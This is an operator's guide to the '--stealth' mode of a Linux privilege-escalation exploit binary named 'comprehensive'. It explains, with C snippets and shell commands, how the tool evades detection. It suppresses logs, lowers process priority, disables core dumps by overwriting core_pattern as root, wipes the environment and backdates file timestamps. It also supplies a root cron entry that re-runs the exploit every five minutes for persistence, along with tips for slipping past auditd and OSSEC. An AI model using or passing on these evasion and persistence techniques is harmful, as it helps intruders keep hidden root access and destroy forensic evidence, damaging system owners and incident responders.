# Stealth Mode (`--stealth`) - Complete Guide

## Overview

**Purpose:** Reduces the detection signature of the exploit by minimizing logging, reducing process visibility, preventing forensic artifacts, and obscuring file modifications.

**When to Use:** 
- In monitored environments
- When avoiding detection is critical
- During automated execution (like cron jobs)
- In production-like testing environments

---

## What Stealth Mode Does

### 1. Reduced Logging Output

**Effect:** Suppresses DEBUG and INFO level messages, only showing WARN, ERROR, and FATAL.

**How it works:**
```c
if (stealth_mode && level <= LOG_LVL_INFO) {
    // Suppress DEBUG and INFO messages
    return;  // Don't display
}
```

**Normal mode output:**
```
[DEBUG] Created directory: ./ovlcap
[INFO] Current UID: 1008, GID: 1008
[INFO] Creating user namespace
[DEBUG] Wrote to file: /proc/self/uid_map
```

**Stealth mode output:**
```
[WARN] AppArmor detected
[ERROR] mount overlay failed: Operation not permitted
```

**Benefit:** Less information in logs = harder to detect exploitation activity.

---

### 2. Process Priority Reduction

**Effect:** Sets process priority to the lowest level (nice value 19).

**How it works:**
```c
nice(19);  // Lowest priority (-20 to 19, 19 = lowest)
```

**What this means:**
- Process gets CPU time only when nothing else needs it
- Appears as low-priority background task
- Less noticeable in process monitoring tools
- Reduces system load signature

**Benefit:** Less suspicious in process monitoring (`top`, `htop`, `ps`).

---

### 3. Core Dump Prevention

**Effect:** Disables core dump generation for the process.

**How it works:**
```c
setrlimit(RLIMIT_CORE, &rlim);  // rlim = {0, 0}
// If root, also:
system("echo '|/bin/false' > /proc/sys/kernel/core_pattern");
```

**What this prevents:**
- No memory dumps if process crashes
- Prevents forensic analysis of memory
- Reduces disk space usage
- Hides crash signatures

**Benefit:** No forensic artifacts left behind from crashes.

---

### 4. Environment Sanitization

**Effect:** Clears environment variables and sets minimal PATH.

**How it works:**
```c
clearenv();  // Remove all environment variables
setenv("PATH", "/usr/local/sbin:/usr/local/bin:...", 1);  // Minimal PATH
```

**What gets removed:**
- `HOME`, `USER`, `SHELL`
- `PWD`, `OLDPWD`
- Custom environment variables
- Potentially identifying information

**Benefit:** Prevents information leakage through environment variables.

---

### 5. File Timestamp Manipulation

**Effect:** Sets file timestamps to 24 hours in the past.

**How it works:**
```c
if (stealth_mode) {
    modify_file_timestamps(path, time(NULL) - 86400);  // 1 day ago
}
```

**Applies to:**
- Created directories
- Written files
- Copied files

**Benefit:** Makes it harder to correlate file creation with exploit execution time.

---

## How to Use Stealth Mode

### Method 1: Command Line Flag

**Usage:**
```bash
./comprehensive --stealth
```

**When to use:**
- Running exploit manually
- Testing stealth capabilities
- Initial exploitation attempt

---

### Method 2: Automatic in Cron Jobs

**Already configured:** The cron persistence option (Option 3) automatically uses `--stealth`:

```bash
*/5 * * * * root /path/to/comprehensive --stealth
```

**Why:** Cron jobs run automatically, so stealth mode reduces detection when they execute.

---

### Method 3: Combined with Quiet Mode

**Usage:**
```bash
./comprehensive --stealth --quiet
# Or
./comprehensive --stealth -q
```

**Effect:**
- `--stealth`: Suppresses INFO/DEBUG, enables other stealth features
- `--quiet` or `-q`: Suppresses all DEBUG messages

**Result:** Maximum silence - only critical errors shown.

---

## Practical Examples

### Example 1: Manual Execution with Stealth

```bash
# Normal execution (verbose)
./comprehensive
# Shows: [DEBUG], [INFO], [WARN], [ERROR] messages

# Stealth execution (minimal output)
./comprehensive --stealth
# Shows: Only [WARN] and [ERROR] messages
```

### Example 2: Cron Job Execution (Automatic Stealth)

When cron executes:
```bash
*/5 * * * * root /path/to/comprehensive --stealth
```

**What happens:**
1. Cron triggers at scheduled time
2. Binary executes with `--stealth` flag
3. Stealth mode activates automatically
4. Minimal logging to reduce detection
5. Process runs at lowest priority
6. No core dumps generated

### Example 3: Testing Stealth Mode

```bash
# Test with stealth enabled
./comprehensive --stealth

# Compare output with normal mode
./comprehensive

# You'll notice:
# - Stealth: Much less output
# - Stealth: Only warnings and errors
# - Stealth: Process runs quieter
```

---

## Stealth Mode Features Breakdown

| Feature | Normal Mode | Stealth Mode | Benefit |
|---------|-------------|--------------|---------|
| **Logging** | All levels (DEBUG, INFO, WARN, ERROR) | Only WARN, ERROR, FATAL | Reduced log footprint |
| **Process Priority** | Normal (0) | Lowest (19) | Less visible in monitoring |
| **Core Dumps** | Enabled | Disabled | No crash artifacts |
| **Environment** | Full environment | Minimal (PATH only) | No info leakage |
| **File Timestamps** | Current time | 24 hours ago | Obscured activity timeline |

---

## When Stealth Mode is Active

### 1. During Exploit Execution

When you run `./comprehensive --stealth`:
- All stealth features activate immediately
- Reduced logging from start
- Process runs at low priority

### 2. During Cron Execution

When cron job executes:
- Stealth mode activates automatically
- Exploit runs quietly in background
- Re-establishes access without much noise

### 3. In Post-Exploitation

Even after privilege escalation:
- Stealth mode remains active
- File operations are timestamped
- Minimal logging continues

---

## Stealth Mode Limitations

### What It Doesn't Do

1. **Network Traffic:** Doesn't hide network connections
2. **Process List:** Process still visible in `ps` (just lower priority)
3. **File System:** Files still created (just with old timestamps)
4. **System Calls:** Doesn't hide system calls from auditd/strace
5. **Memory:** Doesn't hide from memory analysis tools

### What It Does Do

1. ✅ Reduces log output significantly
2. ✅ Lowers process visibility
3. ✅ Prevents core dumps
4. ✅ Cleans environment
5. ✅ Obscures file timestamps

---

## Detection Avoidance Tips

### Combined with Other Techniques

```bash
# Use stealth mode with:
./comprehensive --stealth --quiet

# In cron, already configured:
*/5 * * * * root /path/to/comprehensive --stealth
```

### Manual Stealth Configuration

If you want even more stealth:

1. **Before running:**
   ```bash
   # Lower priority manually
   nice -n 19 ./comprehensive --stealth
   ```

2. **Redirect output:**
   ```bash
   ./comprehensive --stealth > /dev/null 2>&1
   ```

3. **Use nohup:**
   ```bash
   nohup ./comprehensive --stealth &
   ```

---

## Verification

### Check if Stealth Mode is Active

**During execution:**
- Notice reduced output (no DEBUG/INFO messages)
- Check process priority: `ps aux | grep comprehensive` (should show `NI 19`)

**After execution:**
- Check file timestamps: `stat filename` (should show 1 day ago)
- Check environment: `env | wc -l` (should be minimal)
- Check core dumps: `ulimit -c` (should be 0)

---

## Use Cases

### Case 1: Monitored Environment

**Scenario:** Target system has auditd, OSSEC, or similar monitoring.

**Solution:**
```bash
./comprehensive --stealth
```

**Benefit:** Reduced logging = less evidence in monitoring logs.

---

### Case 2: Automated Persistence

**Scenario:** Cron job runs every 5 minutes.

**Solution:** Already configured with `--stealth` in cron entry.

**Benefit:** Quiet re-execution every 5 minutes.

---

### Case 3: Production Testing

**Scenario:** Testing in production-like environment where detection matters.

**Solution:**
```bash
./comprehensive --stealth --quiet
```

**Benefit:** Minimal footprint during testing.

---

## Quick Reference

```bash
# Enable stealth mode
./comprehensive --stealth

# Stealth + quiet
./comprehensive --stealth -q

# Check if running in stealth
ps aux | grep comprehensive
# Look for: NI 19 (nice value)

# Verify stealth logging
./comprehensive --stealth
# Should see minimal output

# Normal mode (for comparison)
./comprehensive
# Should see verbose output
```

---

## Conclusion

Stealth mode is a **useful feature** that reduces the detection signature of the exploit by:

1. **Suppressing verbose logging** - Only shows important warnings/errors
2. **Lowering process priority** - Makes process less visible
3. **Preventing core dumps** - No forensic artifacts
4. **Cleaning environment** - No information leakage
5. **Manipulating timestamps** - Obscures activity timeline

**Best use:** Combine with cron persistence for automatic, quiet re-execution every 5 minutes.

**Remember:** Stealth mode reduces detection but doesn't eliminate it entirely. Use additional OPSEC measures for maximum stealth.
